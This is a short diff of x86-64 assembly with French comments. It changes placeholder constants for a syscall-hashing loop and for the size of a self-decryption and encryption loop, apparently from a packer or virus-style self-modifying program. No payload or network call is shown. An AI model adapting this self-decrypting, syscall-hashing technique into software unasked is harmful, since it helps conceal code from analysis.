@@ -87,9 +87,9 @@ hash:
 	nop
 	lea rcx, [syscalls] ;adresse syscalls
 hash_loop1:
-	cmp rsi,0x107;|REPLACE3| offset key a eviter
+	cmp rsi,0x11f;|REPLACE3| offset key a eviter
 	jl after_cmp
-	cmp rsi,0x10b;|REPLACE4| offset key a eviter
+	cmp rsi,0x123;|REPLACE4| offset key a eviter
 	jle hash_loop2
 after_cmp:
 	shl edi, 5
@@ -181,7 +181,7 @@ ft_end:
 	nop
 	mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x45cf;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x45c5;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	jmp after_exit_3
 	jmp after_exit_4
